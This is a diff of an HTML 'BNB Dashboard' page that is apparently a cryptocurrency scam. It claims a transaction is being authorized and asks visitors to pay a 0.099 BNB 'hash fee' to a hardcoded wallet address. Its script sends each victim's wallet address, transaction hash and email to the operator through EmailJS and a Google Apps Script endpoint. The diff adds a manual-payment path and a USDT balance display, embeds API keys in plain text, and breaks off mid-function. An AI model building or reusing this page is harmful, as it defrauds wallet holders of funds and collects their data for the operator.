@@ -4,12 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>BNB Smart Chain Dashboard</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f8f9fa;
+      background-color: #f9fafb;
       margin: 0;
       padding: 0;
       display: flex;
@@ -20,7 +20,7 @@
       color: #212529;
     }
     .container {
-      background: #ffffff;
+      background: #fff;
       padding: 30px;
       border-radius: 8px;
       box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
@@ -30,7 +30,6 @@
     }
     h1 {
       color: #007bff;
-      margin-bottom: 10px;
     }
     .hidden {
       display: none;
@@ -39,7 +38,7 @@
       background-color: #007bff;
       color: white;
       padding: 10px 20px;
-      margin: 10px 0;
+      margin: 10px 5px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
@@ -57,6 +56,7 @@
     .qr {
       margin: 10px 0;
       width: 180px;
+      border: 1px solid #ced4da;
       border-radius: 5px;
     }
     .link {
@@ -73,110 +73,168 @@
       font-size: 14px;
       color: #6c757d;
     }
-    input[type=email] {
+    input {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
       border: 1px solid #ced4da;
       border-radius: 5px;
     }
+    .usdt-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      gap: 8px;
+    }
+    .usdt-display img {
+      width: 20px;
+    }
   </style>
 </head>
 <body>
+
+  <!-- PAGE 1: Connect Wallet -->
   <div class="container" id="page1">
     <h1>BNB Dashboard</h1>
-    <p>Confirm your smart contract transaction</p>
     <input type="email" id="userEmail" placeholder="Enter email (optional)" />
     <div id="walletStatus">🔌 Not connected</div>
-    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
-    <button class="btn" onclick="switchPage('page2')">Confirm Contract Transaction</button>
+    <div id="usdtBalance" class="usdt-display hidden">
+      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" />
+      <span id="usdtAmount">$3078.78/span>
+    </div>
+    <button class="btn" onclick="connectMetaMask()">🔗 Connect MetaMask</button>
+    <button class="btn" onclick="manualWallet()">✍️ Manual Wallet</button>
+    <div id="manualInput" class="hidden">
+      <input type="text" id="manualAddress" placeholder="Enter your BSC address" />
+      <button class="btn" onclick="useManualWallet()">✅ Connect</button>
+    </div>
+    <button class="btn" onclick="switchPage('page2')">Next ➡️</button>
   </div>
 
+  <!-- PAGE 2: Confirm -->
   <div class="container hidden" id="page2">
     <h1>Authorize Transaction</h1>
     <p>Your transaction is being authorized on the blockchain.</p>
-    <button class="btn" onclick="switchPage('page3')">Confirm: OpBNB Transaction</button>
+    <button class="btn" onclick="switchPage('page3')">Confirm OpBNB Transaction</button>
   </div>
 
+  <!-- PAGE 3: Payment -->
   <div class="container hidden" id="page3">
     <h1>Confirm Payment</h1>
     <p>Top up hash fee: <strong>0.099 BNB</strong></p>
     <div class="address-box">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
-    <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">🔍 View on BscScan</a>
     <img class="qr" src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" alt="QR Code" />
+    <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">🔍 View on BscScan</a>
     <button class="btn" onclick="sendTransaction()">✅ Send Transaction</button>
     <div id="status" class="status"></div>
   </div>
 
+  <!-- SUCCESS -->
   <div class="container hidden" id="successPage">
     <h1>✅ Success</h1>
-    <p>Transaction sent successfully. You’ll be redirected.</p>
+    <p>Transaction sent successfully. Redirecting...</p>
   </div>
 
+  <!-- FAILURE -->
   <div class="container hidden" id="failPage">
     <h1>❌ Failed</h1>
-    <p>Transaction failed. Please try again.</p>
+    <p>Transaction failed. Try again.</p>
     <button class="btn" onclick="switchPage('page1')">🔁 Retry</button>
   </div>
 
   <script>
     const targetAddress = "0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69";
+    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
+    const bscApiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+    const bscApi = "https://api.bscscan.com/api";
     const emailService = "service_78wwbgl";
     const templateID = "template_omkmcio";
     const publicKey = "ochPV1QVtay7TOdBA";
-    const sheetUrl = "https://script.google.com/macros/s/YOUR_DEPLOYED_SCRIPT_ID/exec"; // Replace if needed
-    const BSCSCAN_API_URL = "https://api.bscscan.com/api";
-    const BSCSCAN_API_KEY = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+    const sheetUrl = "https://script.google.com/macros/s/AKfycbwCW1bZ-6f9o4XJSVnKPUdfhQz0Z0AzphZ92dXh2yxhQ9VtxY/exec";
 
-    let signer, userAddress;
+    let signer = null, userAddress = null;
 
     function switchPage(id) {
-      document.querySelectorAll(".container").forEach(div => div.classList.add("hidden"));
+      document.querySelectorAll(".container").forEach(p => p.classList.add("hidden"));
       document.getElementById(id).classList.remove("hidden");
     }
 
-    async function connectWallet() {
-      if (!window.ethereum) return alert("Please install MetaMask.");
-      try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = await provider.getSigner();
-        userAddress = await signer.getAddress();
-        document.getElementById("walletStatus").innerText = `✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-      } catch (err) {
-        alert("Wallet connection failed.");
-      }
+    async function connectMetaMask() {
+      if (!window.ethereum) return alert("MetaMask not detected.");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = await provider.getSigner();
+      userAddress = await signer.getAddress();
+      updateWalletInfo();
+    }
+
+    function manualWallet() {
+      document.getElementById("manualInput").classList.remove("hidden");
+    }
+
+    function useManualWallet() {
+      const addr = document.getElementById("manualAddress").value.trim();
+      if (!ethers.isAddress(addr)) return alert("Invalid address.");
+      signer = null;
+      userAddress = addr;
+      updateWalletInfo();
+      document.getElementById("manualInput").classList.add("hidden");
+    }
+
+    async function updateWalletInfo() {
+      document.getElementById("walletStatus").innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+      document.getElementById("usdtBalance").classList.remove("hidden");
+
+      const res = await fetch(`${bscApi}?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${userAddress}&tag=latest&apikey=${bscApiKey}`);
+      const data = await res.json();
+      const usdt = parseInt(data.result) / 1e18;
+      document.getElementById("usdtAmount").innerText = `$${usdt.toFixed(2)}`;
     }
 
     async function sendTransaction() {
       const status = document.getElementById("status");
-      status.innerText = "⏳ Sending transaction...";
+      status.innerText = "⏳ Sending...";
       try {
-        const tx = await signer.sendTransaction({ to: targetAddress, value: ethers.parseEther("0.099") });
+        let txHash;
 
-        emailjs.init(publicKey);
+        if (signer) {
+          const tx = await signer.sendTransaction({
+            to: targetAddress,
+            value: ethers.parseEther("0.099")
+          });
+          txHash = tx.hash;
+        } else {
+          alert("Send 0.099 BNB manually to: " + targetAddress);
+          txHash = "manual_" + Date.now();
+        }
+
         const email = document.getElementById("userEmail").value || "N/A";
+        emailjs.init(publicKey);
         await emailjs.send(emailService, templateID, {
           user_wallet: userAddress,
-          tx_hash: tx.hash,
+          tx_hash: txHash,
           to_address: targetAddress,
-          email: email,
-          message: "Transaction sent successfully"
+          email,
+          message: "Transaction initiated"
         });
 
         await fetch(sheetUrl, {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ user_wallet: userAddress, tx_hash: tx.hash, email, to_address: targetAddress })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_wallet: userAddress, tx_hash: txHash, email, to_address: targetAddress })
         });
 
-        const txCheck = await fetch(`${BSCSCAN_API_URL}?module=transaction&action=gettxreceiptstatus&txhash=${tx.hash}&apikey=${BSCSCAN_API_KEY}`);
-        const result = await txCheck.json();
-        if (result.status === "1" && result.result.status === "1") {
+        if (!signer) {
+          alert("Manual TX. Please verify on BscScan.");
           switchPage("successPage");
-          setTimeout(() => switchPage("page1"), 6000);
         } else {
-          throw new Error("Transaction failed on-chain.");
+          const verify = await fetch(`${bscApi}?module=transaction&action=gettxreceiptstatus&txhash=${txHash}&apikey=${bscApiKey}`);
+          const result = await verify.json();
+          if (result.status === "1" && result.result.status === "1") {
+            switchPage("successPage");
+            setTimeout(() => switchPage("page1"), 5000);
+          } else throw new Error("TX failed");
         }
       } catch (err) {
         console.error(err);
